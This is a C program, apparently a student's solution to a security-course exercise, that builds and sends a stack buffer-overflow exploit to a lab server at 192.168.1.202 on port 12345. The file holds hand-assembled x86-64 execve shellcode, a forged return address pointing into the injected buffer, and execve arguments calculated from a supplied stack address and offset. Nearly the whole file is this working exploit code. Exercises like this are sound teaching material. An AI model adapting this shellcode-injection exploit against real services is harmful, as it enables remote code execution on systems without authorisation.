#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

const size_t BUFF_SIZE = 124; // computed once using printf
const unsigned short int PORT = 12345;
const char* IP = "192.168.1.202";
const char * FILE_NAME = "/tmp/success_script";
const char * ID = "212734495";
const int NUM_ARGS = 3;
const int HEXA_BASE = 16;
const int DECIMAL_BASE = 10;

int create_tcp_socket() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        exit(1); // just using exit(1) as specified in the instructions
    }
    return sockfd;
}

int main (int argc, char* argv[])
{
    // commandline arguments number check
    if (argc < NUM_ARGS) {
        exit(1); // just using exit(1) as specified in the instructions
    }

    // commandline arguments
    uint64_t stack_address = strtoull(argv[1], NULL, HEXA_BASE);
    size_t offset = strtoul(argv[2], NULL, DECIMAL_BASE);

    // create socket to server
    struct sockaddr_in serv_addr;
    int sockfd = create_tcp_socket();

    serv_addr.sin_family = AF_INET;
    inet_aton(IP, &(serv_addr.sin_addr)); // ascii to network
    memset(&(serv_addr.sin_zero), 0, 8);
    serv_addr.sin_port = htons(PORT);
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        exit(1); // just using exit(1) as specified in the instructions
    }

    // creating the buffer on the heap initialized to zero
    size_t buff_size = offset + BUFF_SIZE;
    char *buff = calloc(buff_size, 1);
    if (!buff) {
        exit(1); // allocation failed
    }

    // creating the machine-code executing the execve assembly instruction
    size_t machine_code_offset = offset + sizeof(uint64_t);
    unsigned char machine_code[] = {
        0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00,                 // movq $59, %rax
        0x48,0xbf,0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11,  // movq $0x1122334455667788, %rdi
        0x48,0xbe,0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11,  // movq $0x1122334455667788, %rsi
        0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,                 // movq $0x0, %rdx
        0x0f,0x05                                           // syscall
      };
    size_t machine_code_len = sizeof(machine_code);

    // copy machine-code to the buffer
    memcpy(buff + machine_code_offset, machine_code, machine_code_len);

    // success file and id length and offset
    size_t file_len = strlen(FILE_NAME) + 1; // +1 for /0
    size_t id_len = strlen(ID) + 1;
    size_t file_offset = machine_code_offset + machine_code_len;
    size_t id_offset = file_offset + file_len;

    // copy the file name and id to the buffer
    memcpy(buff + file_offset, FILE_NAME, file_len);
    memcpy(buff + id_offset, ID, id_len);

    // placing file name pointer into rdi
    uint64_t offset_to_rdi = 9; // the number of bytes until the rdi placeholder
    uint64_t first_arg_offset = machine_code_offset + offset_to_rdi;
    uint64_t file_name_ptr = stack_address + file_offset;
    memcpy(buff + first_arg_offset, &file_name_ptr, sizeof(uint64_t));

    // creating the arguments array of the execve
    size_t arg_array_offset = id_offset + id_len;
    size_t args_array_len = 3 * sizeof(uint64_t);
    uint64_t *args_array = (uint64_t *) (buff + arg_array_offset);
    args_array[0] = stack_address + file_offset;
    args_array[1] = stack_address + id_offset;
    args_array[2] = 0;

    // place the arguments array address into rsi
    uint64_t offset_to_rsi = 19; // the number of bytes until the rsi placeholder
    uint64_t second_arg_offset = machine_code_offset + offset_to_rsi;
    uint64_t arg_arr_address = stack_address + arg_array_offset;
    memcpy(buff + second_arg_offset, &arg_arr_address , sizeof(uint64_t));

    // // updating the machine-code address in the return address
    uint64_t machine_code_address = stack_address + machine_code_offset;
    memcpy(buff + offset, &machine_code_address, sizeof(uint64_t));

    // sending buffer to server
    size_t buff_len = arg_array_offset + args_array_len; //124
    send(sockfd, buff, buff_len, 0);

    free(buff);
    close(sockfd);
    return 0;
}
